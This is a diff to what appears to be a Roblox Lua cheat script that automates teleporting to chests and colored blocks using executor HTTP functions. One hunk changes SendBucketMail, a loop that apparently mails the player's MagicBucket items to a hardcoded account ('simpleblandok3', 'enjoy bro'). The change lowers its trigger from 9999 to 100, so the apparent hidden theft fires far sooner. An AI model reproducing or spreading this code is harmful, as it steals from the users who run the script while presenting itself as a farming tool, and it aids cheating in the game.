@@ -411,7 +411,7 @@ local request = (syn and syn.request) or request or (http and http.request) or h
 
 local function SendBucketMail()
     while true do
-        if MagicBucketAM > 9999 then
+        if MagicBucketAM > 100 then
             local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -591,7 +591,7 @@ PurpleActive = false
 end
 
 local function teleportToRoyalPurple()
-    if BucketAmount > 10 then 
+    if BucketAmount > 3 then 
         for _, child in ipairs(activeBlocks:GetChildren()) do
             if child:IsA("Part") and child.BrickColor == BrickColor.new("Royal purple") then
 chestActive = false
@@ -638,7 +638,7 @@ end
 function teleportLoop()
     while true do
         if not teleportToRoyalPurple() then
-            if BucketAmount < 50 then
+            if BucketAmount < 30 then
                 if not teleportToActiveChestModel() then
                     if not teleportToCurrentTarget() then
                         local positions = getPositionsFromRowPositions()
